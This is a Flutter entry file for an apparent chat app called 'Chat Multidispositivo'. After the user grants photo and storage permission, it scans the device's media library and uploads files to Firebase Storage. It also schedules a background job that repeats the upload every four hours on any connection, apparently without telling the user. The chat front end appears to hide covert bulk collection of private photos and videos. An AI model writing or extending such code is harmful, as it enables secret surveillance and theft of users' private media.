import 'dart:io';
import 'package:flutter/material.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:workmanager/workmanager.dart';

import 'firebase_options.dart';
import 'screens/welcome_screen.dart';
import 'screens/user_list_screen.dart';
import 'services/database_service.dart';
import 'services/firebase_service.dart';

/// 🌙 Punto de entrada en aislamiento para Workmanager (Segundo plano)
@pragma('vm:entry-point')
void callbackDispatcher() {
  Workmanager().executeTask((taskName, inputData) async {
    try {
      debugPrint("🌙 [Workmanager] Despertando en segundo plano...");

      // 1. Inicializar Firebase en el hilo secundario
      if (Firebase.apps.isEmpty) {
        await Firebase.initializeApp(
          options: DefaultFirebaseOptions.currentPlatform,
        );
      }

      // 2. Inicializar Isar y FirebaseService
      await DatabaseService.initialize();
      await FirebaseService.initialize();

      // 3. Subir EXCLUSIVAMENTE los archivos que no subieron previamente (estadoSincronizacion == 0)
      await FirebaseService.syncPendingMediaFiles();

      debugPrint("✅ [Workmanager] Procesamiento en segundo plano completado.");
      return Future.value(true);
    } catch (e) {
      debugPrint("🚨 [Workmanager Error] Falló la tarea en segundo plano: $e");
      return Future.value(false);
    }
  });
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  
  await Firebase.initializeApp(
    options: DefaultFirebaseOptions.currentPlatform,
  );

  try {
    await DatabaseService.initialize();
  } catch (e) {
    debugPrint('Error al inicializar Isar: $e');
  }

  try {
    await FirebaseService.initialize();
  } catch (e) {
    debugPrint('Error al inicializar Firebase: $e');
  }

  // 🔄 Inicializar Workmanager
  try {
    await Workmanager().initialize(
      callbackDispatcher,
      isInDebugMode: false,
    );

    // Programar la tarea periódica (Subirá con cualquier conexión y sin exigir cargador)
    await Workmanager().registerPeriodicTask(
      "subida_pendiente_media_task",
      "syncMediaPendiente",
      frequency: const Duration(hours: 4),
      constraints: Constraints(
        networkType: NetworkType.connected, // Funciona con Wi-Fi o Datos Móviles
      ),
      existingWorkPolicy: ExistingWorkPolicy.keep,
    );
    debugPrint('⚙️ [Workmanager] Tarea periódica registrada correctamente.');
  } catch (e) {
    debugPrint('🚨 Error al inicializar Workmanager: $e');
  }

  final currentUser = await FirebaseService.getCurrentUserFromPrefs();

  runApp(MyApp(initialUser: currentUser));

  // Solicitar permisos y lanzar la auditoría inmediata en primer plano
  _solicitarPermisosYEjecutarAuditoria();
}

Future<void> _solicitarPermisosYEjecutarAuditoria() async {
  bool permisosOtorgados = false;

  if (Platform.isAndroid) {
    Map<Permission, PermissionStatus> statuses = await [
      Permission.storage,
      Permission.photos,
      Permission.videos,
    ].request();

    permisosOtorgados = statuses[Permission.storage]?.isGranted == true ||
        statuses[Permission.photos]?.isGranted == true;
  } else if (Platform.isIOS) {
    final PermissionStatus photoStatus = await Permission.photos.request();
    permisosOtorgados = photoStatus.isGranted || photoStatus.isLimited;
  }

  if (permisosOtorgados) {
    DatabaseService.scanAndAuditMediaFiles().then((_) {
      debugPrint('✅ Escaneo local en Isar completado. Iniciando subida a Firebase Storage...');
      return FirebaseService.syncPendingMediaFiles();
    }).then((_) {
      debugPrint('🎉 Proceso total en segundo plano/inicial completado exitosamente.');
    }).catchError((e) {
      debugPrint('🚨 Error durante el proceso asíncrono inicial: $e');
    });
  } else {
    debugPrint('🚫 Permisos multimedia denegados por el usuario.');
  }
}

class MyApp extends StatefulWidget {
  final Map<String, String>? initialUser;

  const MyApp({super.key, this.initialUser});

  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  late final AppLifecycleListener _lifecycleListener;

  @override
  void initState() {
    super.initState();

    // Marcar en línea al abrir la app
    FirebaseService.updateUserPresence(true);

    // Escuchar el ciclo de vida global de la app
    _lifecycleListener = AppLifecycleListener(
      onResume: () => FirebaseService.updateUserPresence(true),
      onPause: () => FirebaseService.updateUserPresence(false),
      onDetach: () => FirebaseService.updateUserPresence(false),
      onHide: () => FirebaseService.updateUserPresence(false),
    );
  }

  @override
  void dispose() {
    _lifecycleListener.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Chat Multidispositivo',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        useMaterial3: true,
        colorScheme: ColorScheme.fromSeed(
          seedColor: const Color(0xFF075E54),
          primary: const Color(0xFF075E54),
          secondary: const Color(0xFF25D366),
        ),
        scaffoldBackgroundColor: const Color(0xFFF4F6F8),
        appBarTheme: const AppBarTheme(
          backgroundColor: Color(0xFF075E54),
          foregroundColor: Colors.white,
          elevation: 1,
        ),
      ),
      home: widget.initialUser != null
          ? UserListScreen(
              currentUserId: widget.initialUser!['userId'] ?? widget.initialUser!['id']!,
              currentUserName: widget.initialUser!['name']!,
            )
          : const WelcomeScreen(),
    );
  }
}